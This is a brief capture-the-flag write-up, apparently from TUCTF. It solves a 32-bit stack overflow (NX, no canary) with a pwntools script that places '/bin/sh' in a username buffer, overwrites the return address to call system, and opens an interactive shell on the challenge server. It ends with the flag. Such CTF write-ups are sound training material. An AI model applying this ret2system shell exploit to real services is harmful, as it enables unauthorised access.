Solved by Dan
Just a standard stack overflow, NX but no Canary. We can stick “/bin/sh” in our username and jump to system

#!/usr/bin/env python3.7
import pwn

MAIN = 0x08049709
USERNAME = 0x0804c080
SYSTEM = 0x080490b0
BUFFER_SIZE = 0x48

PAYLOAF = b'a' * (BUFFER_SIZE + 4) + pwn.p32(SYSTEM) + pwn.p32(0) + pwn.p32(USERNAME)
r = pwn.remote('chal.tuctf.com', 30500)
r.sendline('/bin/sh')
r.sendline('1')
r.sendline('2')
r.sendline(PAYLOAF)
r.interactive()

TUCTF{f1l73r_f1r57_7h3y_541d._y0u'll_b3_53cur3_7h3y_541d}

